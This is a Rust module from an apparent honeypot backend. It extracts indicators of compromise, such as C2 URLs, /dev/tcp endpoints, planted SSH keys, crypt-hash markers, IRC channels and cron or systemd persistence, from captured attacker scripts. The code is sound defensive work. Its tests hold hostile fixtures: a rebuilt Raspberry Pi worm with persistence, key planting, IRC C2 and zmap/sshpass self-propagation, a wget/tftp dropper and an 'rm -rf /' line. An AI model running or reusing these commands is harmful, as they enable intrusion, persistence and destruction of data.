//! Indicator extraction from captured text: a dropper script, a systemd unit streamed over stdin,
//! a command line. Pure text scanning, no I/O and no shell evaluation, like `fetcher::extract`,
//! whose URL resolver it reuses.
//!
//! Every input is attacker data, and so is every indicator taken from it. Each value and detail
//! goes through [`sanitize_field`] (the sensors' own sanitizer, then a byte cap) before it leaves
//! this module, the number of indicators per input is capped, and the console renders them as
//! escaped text, never as a link. A password hash is reduced to a marker (its scheme and a digest
//! prefix of the crypt string): it is evidence that a credential was planted, not a credential.
//!
//! The kinds and how each is recognized:
//! - `url`: what `fetcher::extract::extract_urls` resolves (http, https and tftp forms, simple
//!   variable assignments and one level of `for` loop); detail is the host and port.
//! - `endpoint`: bash `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` redirections.
//! - `ssh_key`: an OpenSSH public key line whose base64 blob decodes and names its own key type;
//!   the value is the `SHA256:` fingerprint `ssh-keygen -l` prints, the detail the type and comment.
//! - `rsa_key`: a PEM `PUBLIC KEY` or `RSA PUBLIC KEY` block; the value is the SHA-256 of its DER.
//! - `password_hash`: `$1$`, `$5$`, `$6$` (with optional `rounds=`), `$2a$/$2b$/$2y$` and `$y$`
//!   crypt strings, stored as a marker only.
//! - `irc_server` and `irc_channel`: in text that speaks IRC (`PRIVMSG`, `NICK`, `JOIN`, a 666x
//!   port), `irc.` host names and hosts on IRC ports; channels after `JOIN` or assigned to a
//!   variable whose name contains `chan`.
//! - `hosts_entry`: an address and host name pair on a line that writes `/etc/hosts` (a sinkhole).
//! - `persistence`: cron entries (`@reboot`-style or five time fields), systemd unit names and
//!   `ExecStart=` lines, and writes to `/etc/rc.local`.

use std::collections::HashSet;
use std::net::Ipv4Addr;

use base64::Engine;
use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD};
use sensor_framework::sanitize_value;
use sha2::{Digest, Sha256};

/// Indicators kept from one captured artifact.
pub const MAX_IOCS_PER_ARTIFACT: usize = 64;
/// Indicators kept from one command or download event.
pub const MAX_IOCS_PER_COMMAND: usize = 16;
/// Longest stored value, in bytes, after sanitization.
pub const MAX_IOC_VALUE_BYTES: usize = 256;
/// Longest stored detail, in bytes, after sanitization.
pub const MAX_IOC_DETAIL_BYTES: usize = 128;
/// Largest artifact scanned. A dropper or unit file is a few KB; this also bounds the scan.
pub const MAX_ARTIFACT_TEXT_BYTES: usize = 64 * 1024;
/// Longest cron or rc.local line kept as a persistence value, in characters, before the byte cap.
const MAX_PERSISTENCE_LINE_CHARS: usize = 200;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum IocKind {
    Url,
    Endpoint,
    SshKey,
    RsaKey,
    PasswordHash,
    IrcServer,
    IrcChannel,
    HostsEntry,
    Persistence,
}

impl IocKind {
    pub const ALL: [IocKind; 9] = [
        IocKind::Url,
        IocKind::Endpoint,
        IocKind::SshKey,
        IocKind::RsaKey,
        IocKind::PasswordHash,
        IocKind::IrcServer,
        IocKind::IrcChannel,
        IocKind::HostsEntry,
        IocKind::Persistence,
    ];

    /// The stored `ioc.kind` value (migration 0015's CHECK list).
    pub fn as_str(self) -> &'static str {
        match self {
            IocKind::Url => "url",
            IocKind::Endpoint => "endpoint",
            IocKind::SshKey => "ssh_key",
            IocKind::RsaKey => "rsa_key",
            IocKind::PasswordHash => "password_hash",
            IocKind::IrcServer => "irc_server",
            IocKind::IrcChannel => "irc_channel",
            IocKind::HostsEntry => "hosts_entry",
            IocKind::Persistence => "persistence",
        }
    }

    pub fn parse(s: &str) -> Option<IocKind> {
        IocKind::ALL.into_iter().find(|k| k.as_str() == s)
    }

    /// The console's label for the kind.
    pub fn label(self) -> &'static str {
        match self {
            IocKind::Url => "URL",
            IocKind::Endpoint => "endpoint",
            IocKind::SshKey => "SSH key",
            IocKind::RsaKey => "RSA public key",
            IocKind::PasswordHash => "password hash",
            IocKind::IrcServer => "IRC server",
            IocKind::IrcChannel => "IRC channel",
            IocKind::HostsEntry => "hosts entry",
            IocKind::Persistence => "persistence",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Indicator {
    pub kind: IocKind,
    pub value: String,
    pub detail: String,
}

/// Neutralize one attacker-derived string for storage: line breaks, terminal escapes, control,
/// bidirectional and invisible characters go (`sensor_framework::sanitize_value`), then the result
/// is trimmed and cut to `max_bytes` on a character boundary.
pub fn sanitize_field(raw: &str, max_bytes: usize) -> String {
    sanitize_value(raw, max_bytes).trim().to_string()
}

/// Whether a captured body is text worth scanning: valid UTF-8, no NUL, and at most 1 in 50
/// characters a control character other than a line break or tab.
pub fn looks_like_text(bytes: &[u8]) -> bool {
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    if text.contains('\0') {
        return false;
    }
    let total = text.chars().count().max(1);
    let controls = text
        .chars()
        .filter(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
        .count();
    controls * 50 <= total
}

/// The indicators in a captured artifact, or `None` when it is not text or is larger than
/// [`MAX_ARTIFACT_TEXT_BYTES`].
pub fn extract_from_artifact(bytes: &[u8]) -> Option<Vec<Indicator>> {
    if bytes.len() > MAX_ARTIFACT_TEXT_BYTES || !looks_like_text(bytes) {
        return None;
    }
    let text = std::str::from_utf8(bytes).ok()?;
    Some(extract(text, MAX_IOCS_PER_ARTIFACT))
}

/// The indicators in one command line.
pub fn extract_from_command(command: &str) -> Vec<Indicator> {
    extract(command, MAX_IOCS_PER_COMMAND)
}

/// Whether a script carries both a network scanner and a way to copy itself to the hosts it finds:
/// the shape of a worm such as the Raspberry Pi one (zmap, then sshpass and scp). A heuristic, used
/// only to label a sample campaign's members as infected hosts on the console.
pub fn self_propagating(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let scans = ["zmap", "masscan", "pnscan"]
        .iter()
        .any(|t| lower.contains(t));
    let copies = ["sshpass", "scp "].iter().any(|t| lower.contains(t));
    scans && copies
}

/// Every indicator in `text`, at most `cap`, the highest-value kinds first so a crafted flood of
/// URLs cannot push a planted key out of the result.
pub fn extract(text: &str, cap: usize) -> Vec<Indicator> {
    let text = truncate(text, MAX_ARTIFACT_TEXT_BYTES);
    let mut out = Collector::new(cap);
    ssh_keys(text, &mut out);
    pem_keys(text, &mut out);
    password_hashes(text, &mut out);
    hosts_entries(text, &mut out);
    irc(text, &mut out);
    persistence(text, &mut out);
    urls(text, &mut out);
    endpoints(text, &mut out);
    out.items
}

struct Collector {
    items: Vec<Indicator>,
    seen: HashSet<(IocKind, String)>,
    cap: usize,
}

impl Collector {
    fn new(cap: usize) -> Self {
        Self {
            items: Vec::new(),
            seen: HashSet::new(),
            cap,
        }
    }

    fn full(&self) -> bool {
        self.items.len() >= self.cap
    }

    fn push(&mut self, kind: IocKind, value: &str, detail: &str) {
        if self.full() {
            return;
        }
        let value = sanitize_field(value, MAX_IOC_VALUE_BYTES);
        if value.is_empty() || !self.seen.insert((kind, value.clone())) {
            return;
        }
        self.items.push(Indicator {
            kind,
            value,
            detail: sanitize_field(detail, MAX_IOC_DETAIL_BYTES),
        });
    }
}

fn truncate(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[..end]
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// Shell words, split on whitespace, quotes and the operators that end a word, with a literal
/// trailing `\n` (an `echo -e` line end) removed.
fn words(line: &str) -> Vec<&str> {
    line.split(|c: char| {
        c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '>' | '<' | '`' | '(' | ')')
    })
    .map(|w| w.trim_end_matches("\\n").trim_end_matches("\\r"))
    .filter(|w| !w.is_empty())
    .collect()
}

fn is_hostname(s: &str) -> bool {
    s.len() <= 253
        && s.contains('.')
        && !s.starts_with('.')
        && !s.ends_with('.')
        && s.parse::<Ipv4Addr>().is_err()
        && s.chars().any(|c| c.is_ascii_alphabetic())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
}

const SSH_KEY_TYPES: [&str; 8] = [
    "ssh-rsa",
    "ssh-dss",
    "ssh-ed25519",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// The OpenSSH SHA-256 fingerprint of a key blob whose leading string names `key_type`, as
/// `ssh-keygen -l` prints it; `None` when the blob does not decode or names another type.
fn ssh_fingerprint(key_type: &str, blob_b64: &str) -> Option<String> {
    let blob = STANDARD.decode(blob_b64).ok()?;
    let len = u32::from_be_bytes(blob.get(..4)?.try_into().ok()?) as usize;
    if blob.get(4..4 + len)? != key_type.as_bytes() {
        return None;
    }
    Some(format!(
        "SHA256:{}",
        STANDARD_NO_PAD.encode(Sha256::digest(&blob))
    ))
}

fn ssh_keys(text: &str, out: &mut Collector) {
    for line in text.lines() {
        let w = words(line);
        for (i, word) in w.iter().enumerate() {
            if !SSH_KEY_TYPES.contains(word) {
                continue;
            }
            let Some(fingerprint) = w.get(i + 1).and_then(|b| ssh_fingerprint(word, b)) else {
                continue;
            };
            let comment = w
                .get(i + 2)
                .filter(|c| {
                    c.len() <= 64
                        && !SSH_KEY_TYPES.contains(c)
                        && c.chars()
                            .all(|ch| ch.is_ascii_alphanumeric() || "@._+=-".contains(ch))
                })
                .map(|c| format!(", comment {c}"))
                .unwrap_or_default();
            out.push(IocKind::SshKey, &fingerprint, &format!("{word}{comment}"));
        }
    }
}

fn pem_keys(text: &str, out: &mut Collector) {
    for label in ["PUBLIC KEY", "RSA PUBLIC KEY"] {
        let begin = format!("-----BEGIN {label}-----");
        let end = format!("-----END {label}-----");
        let mut rest = text;
        while let Some(at) = rest.find(&begin) {
            let body_start = at + begin.len();
            let Some(len) = rest[body_start..].find(&end) else {
                break;
            };
            let body: String = rest[body_start..body_start + len]
                .replace("\\n", "")
                .replace("\\r", "")
                .chars()
                .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='))
                .collect();
            if let Ok(der) = STANDARD.decode(&body)
                && der.len() >= 32
            {
                out.push(
                    IocKind::RsaKey,
                    &format!("SHA256:{}", STANDARD_NO_PAD.encode(Sha256::digest(&der))),
                    &format!("PEM {label}, {}-byte DER", der.len()),
                );
            }
            rest = &rest[body_start + len + end.len()..];
        }
    }
}

fn is_crypt_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '/')
}

/// The scheme name and byte length of a crypt string at the start of `s` (which starts with `$`).
fn crypt_at(s: &str) -> Option<(&'static str, usize)> {
    // Counting stops one past `max`, so a long run costs no more than the longest valid field.
    let take = |s: &str, min: usize, max: usize| -> Option<usize> {
        let n = s
            .chars()
            .take(max + 1)
            .take_while(|&c| is_crypt_char(c))
            .count();
        (min..=max).contains(&n).then_some(n)
    };
    let rest = s.strip_prefix('$')?;
    // Every scheme id is one or two characters, so only the next three bytes are looked at: a
    // search for the closing `$` across the rest of the text would make a body of many `$`
    // quadratic.
    let id_len = rest.bytes().take(3).position(|b| b == b'$')?;
    let (id, after) = (&rest[..id_len], &rest[id_len + 1..]);
    let head = 1 + id.len() + 1;
    match id {
        "1" | "5" | "6" => {
            let scheme = match id {
                "1" => "md5-crypt",
                "5" => "sha256-crypt",
                _ => "sha512-crypt",
            };
            let mut used = 0;
            let mut fields = after;
            if let Some(r) = fields.strip_prefix("rounds=") {
                let digits = r.chars().take_while(char::is_ascii_digit).count();
                if digits == 0 || r.as_bytes().get(digits) != Some(&b'$') {
                    return None;
                }
                used += "rounds=".len() + digits + 1;
                fields = &r[digits + 1..];
            }
            let salt = fields
                .chars()
                .take(17)
                .take_while(|&c| is_crypt_char(c))
                .count();
            if !(1..=16).contains(&salt) || fields.as_bytes().get(salt) != Some(&b'$') {
                return None;
            }
            let hash = take(&fields[salt + 1..], 22, 86)?;
            Some((scheme, head + used + salt + 1 + hash))
        }
        "2a" | "2b" | "2y" => {
            let cost = after.get(..3)?;
            if !(cost.as_bytes()[..2].iter().all(u8::is_ascii_digit) && cost.ends_with('$')) {
                return None;
            }
            let n = take(&after[3..], 53, 53)?;
            Some(("bcrypt", head + 3 + n))
        }
        "y" => {
            let params = take(after, 1, 32)?;
            let salt_part = after.get(params..)?.strip_prefix('$')?;
            let salt = take(salt_part, 1, 64)?;
            let hash_part = salt_part.get(salt..)?.strip_prefix('$')?;
            let hash = take(hash_part, 43, 43)?;
            Some(("yescrypt", head + params + 1 + salt + 1 + hash))
        }
        _ => None,
    }
}

fn password_hashes(text: &str, out: &mut Collector) {
    for (at, _) in text.match_indices('$') {
        if out.full() {
            return;
        }
        // A crypt string is a whole word: `$6$...` inside `x$6$...` is not one.
        if at > 0 && text[..at].chars().next_back().is_some_and(is_crypt_char) {
            continue;
        }
        let Some((scheme, len)) = crypt_at(&text[at..]) else {
            continue;
        };
        let crypt = &text[at..at + len];
        if text[at + len..].chars().next().is_some_and(is_crypt_char) {
            continue;
        }
        let digest = hex(&Sha256::digest(crypt.as_bytes()));
        out.push(
            IocKind::PasswordHash,
            &format!("{scheme} sha256:{}", &digest[..16]),
            "marker only: the hash itself is not stored",
        );
    }
}

fn hosts_entries(text: &str, out: &mut Collector) {
    for line in text.lines().filter(|l| l.contains("/etc/hosts")) {
        let w = words(line);
        for pair in w.windows(2) {
            if pair[0].parse::<Ipv4Addr>().is_ok() && is_hostname(pair[1]) {
                out.push(
                    IocKind::HostsEntry,
                    &format!("{} {}", pair[0], pair[1]),
                    "written to /etc/hosts",
                );
            }
        }
    }
}

const IRC_PORTS: [u16; 12] = [
    6660, 6661, 6662, 6663, 6664, 6665, 6666, 6667, 6668, 6669, 6697, 7000,
];

fn speaks_irc(text: &str) -> bool {
    let upper = text.to_ascii_uppercase();
    [
        "PRIVMSG", "NICK ", "JOIN ", "JOIN :#", ":6667", " 6667", ":6697",
    ]
    .iter()
    .any(|m| upper.contains(m))
}

fn channel_name(s: &str) -> Option<&str> {
    let s = s.trim_start_matches(':');
    let len = s
        .char_indices()
        .take_while(|&(i, c)| {
            (i == 0 && c == '#') || (i > 0 && (c.is_ascii_alphanumeric() || "_-.".contains(c)))
        })
        .count();
    (2..=50).contains(&len).then(|| &s[..len])
}

fn irc(text: &str, out: &mut Collector) {
    if !speaks_irc(text) {
        return;
    }
    for line in text.lines() {
        let w = words(line);
        for (i, word) in w.iter().enumerate() {
            if word.eq_ignore_ascii_case("JOIN")
                && let Some(chan) = w.get(i + 1).and_then(|c| channel_name(c))
            {
                out.push(IocKind::IrcChannel, chan, "joined");
            }
            // `chan="#x"` splits at the quote into `chan=` and `#x`; `chan=#x` stays one word.
            let (name, value) = match word.split_once('=') {
                Some((n, "")) => (n, w.get(i + 1).copied().unwrap_or_default()),
                Some((n, v)) => (n, v),
                None => ("", ""),
            };
            if name.to_ascii_lowercase().contains("chan")
                && let Some(chan) = channel_name(value)
            {
                out.push(IocKind::IrcChannel, chan, &format!("assigned to {name}"));
            }
            for candidate in [*word, value] {
                let (host, port) = match candidate.rsplit_once(':') {
                    Some((h, p)) => (h, p.parse::<u16>().ok()),
                    None => (candidate, None),
                };
                let host = host.trim_start_matches('@');
                let irc_name = host.to_ascii_lowercase().starts_with("irc.") && is_hostname(host);
                let irc_port = port.is_some_and(|p| IRC_PORTS.contains(&p))
                    && (is_hostname(host) || host.parse::<Ipv4Addr>().is_ok());
                if irc_name || irc_port {
                    let value = match port {
                        Some(p) => format!("{host}:{p}"),
                        None => host.to_string(),
                    };
                    out.push(IocKind::IrcServer, &value, "IRC server");
                }
            }
        }
    }
}

const CRON_SPECIALS: [&str; 8] = [
    "@reboot",
    "@hourly",
    "@daily",
    "@weekly",
    "@monthly",
    "@yearly",
    "@annually",
    "@midnight",
];

/// `line` from byte `start` up to the first quote, or the end of the line, trimmed and shortened.
fn clause_from(line: &str, start: usize) -> String {
    let tail = &line[start..];
    let end = tail.find(['"', '\'']).unwrap_or(tail.len());
    tail[..end]
        .trim()
        .trim_end_matches("\\n")
        .chars()
        .take(MAX_PERSISTENCE_LINE_CHARS)
        .collect()
}

fn is_cron_field(w: &str) -> bool {
    !w.is_empty() && w.chars().all(|c| c.is_ascii_digit() || "*/,-".contains(c))
}

fn persistence(text: &str, out: &mut Collector) {
    for line in text.lines() {
        for special in CRON_SPECIALS {
            if let Some(at) = line.find(special) {
                out.push(IocKind::Persistence, &clause_from(line, at), "cron");
            }
        }
        let trimmed = line.trim_start();
        let fields: Vec<&str> = trimmed.split_whitespace().take(6).collect();
        if fields.len() == 6
            && fields[..5].iter().all(|f| is_cron_field(f))
            && fields[..5].iter().any(|f| f.contains('*'))
        {
            out.push(IocKind::Persistence, &clause_from(trimmed, 0), "cron");
        } else if line.contains("cron") {
            let w = words(line);
            if let Some(i) = w.windows(6).position(|f| {
                f[..5].iter().all(|x| is_cron_field(x)) && f[..5].iter().any(|x| x.contains('*'))
            }) {
                // Each word is a slice of `line`, so its offset is exact; searching for its text
                // would find an earlier occurrence of a short field such as `0`.
                let at = w[i].as_ptr() as usize - line.as_ptr() as usize;
                out.push(IocKind::Persistence, &clause_from(line, at), "cron");
            }
        }
        if let Some(exec) = trimmed.strip_prefix("ExecStart=") {
            out.push(
                IocKind::Persistence,
                &format!(
                    "ExecStart={}",
                    exec.chars()
                        .take(MAX_PERSISTENCE_LINE_CHARS)
                        .collect::<String>()
                ),
                "systemd",
            );
        }
        for word in words(line) {
            let name = word.rsplit('/').next().unwrap_or(word);
            if name.len() > ".service".len()
                && name.ends_with(".service")
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "@._-".contains(c))
            {
                out.push(IocKind::Persistence, &format!("unit {name}"), "systemd");
            }
        }
        if line.contains("/etc/rc.local")
            && ["echo", ">>", "sed ", "tee", "printf"]
                .iter()
                .any(|op| line.contains(op))
        {
            let kept: String = line
                .trim()
                .chars()
                .take(MAX_PERSISTENCE_LINE_CHARS)
                .collect();
            out.push(IocKind::Persistence, &kept, "rc.local");
        }
    }
}

fn urls(text: &str, out: &mut Collector) {
    if out.full() {
        return;
    }
    for url in crate::fetcher::extract::extract_urls(text.as_bytes()) {
        let detail = url::Url::parse(&url)
            .ok()
            .and_then(|u| {
                let host = u.host_str()?.to_string();
                Some(match u.port() {
                    Some(p) => format!("{host}:{p}"),
                    None => host,
                })
            })
            .unwrap_or_default();
        out.push(IocKind::Url, &url, &detail);
    }
}

fn endpoints(text: &str, out: &mut Collector) {
    for proto in ["tcp", "udp"] {
        let marker = format!("/dev/{proto}/");
        for (at, _) in text.match_indices(&marker) {
            let rest = &text[at + marker.len()..];
            let Some((host, tail)) = rest.split_once('/') else {
                continue;
            };
            let port: String = tail.chars().take_while(char::is_ascii_digit).collect();
            let host_ok = is_hostname(host) || host.parse::<Ipv4Addr>().is_ok();
            if host_ok && port.parse::<u16>().is_ok() {
                out.push(IocKind::Endpoint, &format!("{host}:{port}"), proto);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Synthetic fixtures, generated for these tests (`ssh-keygen`, `openssl genpkey` and
    /// `openssl passwd` on throwaway inputs); none of them was ever used anywhere. Each expected
    /// fingerprint is the one those tools printed, so the comparison is against an independent
    /// implementation rather than this module's own arithmetic.
    const ED25519_PUB: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDFmxqANE9b/zXSyLtaPfu0i7616fPqt5i7Go32KWvrC synthetic-fixture";
    const ED25519_FP: &str = "SHA256:pJJ5O45oiDv8biQy+j5TSe6JfzJ0daZcA7SkbNOEApA";
    const RSA_PUB: &str = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCkJ0svwN1IartFrJYXX/Dj2f8fJOdo8iDDtnLjJ7V84uQkqM38CFIJfYT9c6mLB4sJFeQ66MakWFhYDUshIY/1AV10R/gQbp0oXgjllgj4kYav3ubMiVNoGRDnvly4xOB2qPRu7E8FK9+X7pgWT4M3Y665ITK06zmum1/6jU7TlQ== fixture-implant";
    const RSA_FP: &str = "SHA256:sp3iA4sTVcgDEn1o6ngfftmg/Yy7O/C9oF71zS52+8U";
    const PEM: &str = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwlYMFcNMfb9gTBcaaXAoCIEja
fhIOa7TrEGr8i0Ts0cSFQ3cu8iCi/hS3nHBdrARVgtdgfg+/frOn1uR1R6Qv0i/2
9byeuvOS58JPt8Lj7VUNzhM2RsUMr7lwoV/A3iVgtaVY6rRcQM0q8kOvy+aqPZY3
Jx4u80n/q0WquQbw1QIDAQAB
-----END PUBLIC KEY-----";
    const PEM_FP: &str = "SHA256:20zQyZa9MGtyKF+I/S7Pm925cAmyL4ACiLaW/dhcIYo";
    const SHA512_CRYPT: &str = "$6$fixtureSALT$lBeuRPfFH0OCOTMICZDWKSkcrEd6lcbvMhvlR8EO8CIQy/n8nJR5B5W4wFOHggxxHpKLCuiGHjO/SyLWVlQvK1";
    const MD5_CRYPT: &str = "$1$abc$EVMRbRKywK.5DC5LGotlr/";

    fn of(kind: IocKind, found: &[Indicator]) -> Vec<String> {
        found
            .iter()
            .filter(|i| i.kind == kind)
            .map(|i| i.value.clone())
            .collect()
    }

    /// Modeled on the Raspberry Pi worm the owner observed, rebuilt with documentation addresses,
    /// example domains and the synthetic keys above.
    fn worm_script() -> String {
        format!(
            "#!/bin/bash\n\
             MYSELF=`realpath $0`\n\
             if [ \"$EUID\" -ne 0 ]; then\n\
               sudo cp $MYSELF /opt/$NEWMYSELF\n\
               sudo sh -c \"echo '/opt/$NEWMYSELF' >> /etc/rc.local\"\n\
             fi\n\
             echo \"127.0.0.1 rival.example.net\" >> /etc/hosts\n\
             usermod -p '{SHA512_CRYPT}' pi\n\
             echo \"{RSA_PUB}\" >> /root/.ssh/authorized_keys\n\
             cat > /tmp/public.pem <<EOFMARKER\n{PEM}\nEOFMARKER\n\
             SRV=\"irc.example.org\"\n\
             chan=\"#fixturechan\"\n\
             echo \"NICK bot$RANDOM\" > /dev/tcp/$SRV/6667\n\
             echo \"JOIN #fixturechan\" >> /tmp/irc\n\
             exec 3<>/dev/tcp/192.0.2.44/6667\n\
             zmap -p 22 -o /tmp/ips.txt\n\
             sshpass -praspberry scp -o ConnectTimeout=6 $MYSELF pi@$ip:/tmp/$NAME\n"
        )
    }

    #[test]
    fn the_worm_script_yields_every_indicator_kind_it_carries() {
        let found = extract_from_artifact(worm_script().as_bytes()).expect("text");
        assert_eq!(of(IocKind::SshKey, &found), vec![RSA_FP.to_string()]);
        let key = found.iter().find(|i| i.kind == IocKind::SshKey).unwrap();
        assert_eq!(key.detail, "ssh-rsa, comment fixture-implant");
        assert_eq!(of(IocKind::RsaKey, &found), vec![PEM_FP.to_string()]);
        let hashes = of(IocKind::PasswordHash, &found);
        assert_eq!(hashes.len(), 1);
        assert!(hashes[0].starts_with("sha512-crypt sha256:"), "{hashes:?}");
        assert_eq!(
            of(IocKind::HostsEntry, &found),
            vec!["127.0.0.1 rival.example.net".to_string()]
        );
        assert_eq!(
            of(IocKind::IrcChannel, &found),
            vec!["#fixturechan".to_string()]
        );
        let servers = of(IocKind::IrcServer, &found);
        assert!(
            servers.contains(&"irc.example.org".to_string()),
            "{servers:?}"
        );
        assert_eq!(
            of(IocKind::Endpoint, &found),
            vec!["192.0.2.44:6667".to_string()]
        );
        let persistence = of(IocKind::Persistence, &found);
        assert!(
            persistence.iter().any(|p| p.contains("/etc/rc.local")),
            "{persistence:?}"
        );
        assert!(self_propagating(&worm_script()));
    }

    #[test]
    fn a_password_hash_is_stored_as_a_marker_never_as_the_hash() {
        let found = extract(
            &format!("usermod -p '{SHA512_CRYPT}' pi; echo {MD5_CRYPT}"),
            16,
        );
        let hashes: Vec<&Indicator> = found
            .iter()
            .filter(|i| i.kind == IocKind::PasswordHash)
            .collect();
        assert_eq!(hashes.len(), 2, "{found:?}");
        for h in &hashes {
            assert!(!h.value.contains('$'), "{h:?}");
            assert!(!h.value.contains("fixtureSALT") && !h.value.contains("abc$"));
        }
        // The marker is the scheme and a digest prefix of the whole crypt string, which an
        // independent sha256 of the same text reproduces.
        let digest = hex(&Sha256::digest(SHA512_CRYPT.as_bytes()));
        assert!(
            hashes
                .iter()
                .any(|h| h.value == format!("sha512-crypt sha256:{}", &digest[..16]))
        );
        assert!(hashes.iter().any(|h| h.value.starts_with("md5-crypt ")));
        // A shell variable or a price is not a crypt string.
        assert!(extract("echo $6 $1$ cost $5$ab", 16).is_empty());
    }

    #[test]
    fn ssh_key_fingerprints_match_ssh_keygen() {
        let found = extract_from_command(&format!(
            "chattr -ia .ssh; echo \"{ED25519_PUB}\" >> .ssh/authorized_keys"
        ));
        assert_eq!(of(IocKind::SshKey, &found), vec![ED25519_FP.to_string()]);
        // A blob that does not name its own type is not a key.
        let lying = ED25519_PUB.replace("ssh-ed25519 AAAA", "ssh-rsa AAAA");
        assert!(of(IocKind::SshKey, &extract_from_command(&lying)).is_empty());
    }

    #[test]
    fn the_w_sh_campaign_persistence_lines_are_found() {
        let unit = "[Unit]\nDescription=watcher\n[Service]\nExecStart=/home/developer/.config/netai -c conf\nRestart=always\n";
        let found = extract_from_artifact(unit.as_bytes()).unwrap();
        assert_eq!(
            of(IocKind::Persistence, &found),
            vec!["ExecStart=/home/developer/.config/netai -c conf".to_string()]
        );
        let cmd = "(crontab -l 2>/dev/null; echo \"@reboot /home/developer/.config/w.sh\"; echo \"0 * * * * /home/developer/.config/w.sh\") | crontab -; systemctl --user enable watcher-netai.service";
        let found = extract_from_command(cmd);
        let p = of(IocKind::Persistence, &found);
        assert!(
            p.contains(&"@reboot /home/developer/.config/w.sh".to_string()),
            "{p:?}"
        );
        assert!(
            p.contains(&"0 * * * * /home/developer/.config/w.sh".to_string()),
            "{p:?}"
        );
        assert!(
            p.contains(&"unit watcher-netai.service".to_string()),
            "{p:?}"
        );
    }

    #[test]
    fn dropper_urls_carry_their_host_and_port() {
        let found = extract_from_command(
            "cd /tmp; wget http://198.51.100.7:8080/amd64 -O /etc/kswpad; tftp -g -r x86 198.51.100.7",
        );
        let urls: Vec<&Indicator> = found.iter().filter(|i| i.kind == IocKind::Url).collect();
        assert!(
            urls.iter()
                .any(|u| u.value == "http://198.51.100.7:8080/amd64"
                    && u.detail == "198.51.100.7:8080"),
            "{found:?}"
        );
        assert!(
            urls.iter().any(|u| u.value == "tftp://198.51.100.7/x86"),
            "{found:?}"
        );
    }

    #[test]
    fn values_are_sanitized_and_capped() {
        // A terminal escape, a bidirectional override and a line break inside a crafted value.
        let crafted = "echo \"@reboot /tmp/\u{1b}[31mred\u{202e}evil\r\nrm -rf /\" | crontab -";
        let found = extract_from_command(crafted);
        let p = of(IocKind::Persistence, &found);
        assert_eq!(p.len(), 1, "{found:?}");
        for c in p[0].chars() {
            assert!(
                !c.is_control() && c != '\u{202e}',
                "unsanitized {c:?} in {:?}",
                p[0]
            );
        }
        let long = format!("echo \"@reboot /tmp/{}\" | crontab -", "a".repeat(5000));
        for i in extract_from_command(&long) {
            assert!(i.value.len() <= MAX_IOC_VALUE_BYTES, "{}", i.value.len());
            assert!(i.detail.len() <= MAX_IOC_DETAIL_BYTES);
        }
        assert!(sanitize_field(&"\u{00e9}".repeat(200), 7).len() <= 7);
    }

    #[test]
    fn the_count_is_capped_with_keys_kept_ahead_of_urls() {
        let mut script: String = (0..500)
            .map(|i| format!("wget http://203.0.113.9/f{i}\n"))
            .collect();
        script.push_str(&format!("echo \"{RSA_PUB}\" >> authorized_keys\n"));
        let found = extract(&script, MAX_IOCS_PER_ARTIFACT);
        assert_eq!(found.len(), MAX_IOCS_PER_ARTIFACT);
        assert_eq!(found[0].kind, IocKind::SshKey);
    }

    #[test]
    fn binary_and_oversized_bodies_are_not_scanned() {
        assert!(extract_from_artifact(b"\x7fELF\x02\x01\x01\0\0\0").is_none());
        assert!(extract_from_artifact(&vec![b'a'; MAX_ARTIFACT_TEXT_BYTES + 1]).is_none());
        assert!(extract_from_artifact(b"#!/bin/sh\necho hi\n").is_some());
        assert!(!self_propagating("wget http://198.51.100.1/x; sh x"));
    }

    #[test]
    fn every_kind_round_trips_through_its_stored_name() {
        for kind in IocKind::ALL {
            assert_eq!(IocKind::parse(kind.as_str()), Some(kind));
        }
        assert_eq!(IocKind::parse("credential"), None);
    }
}
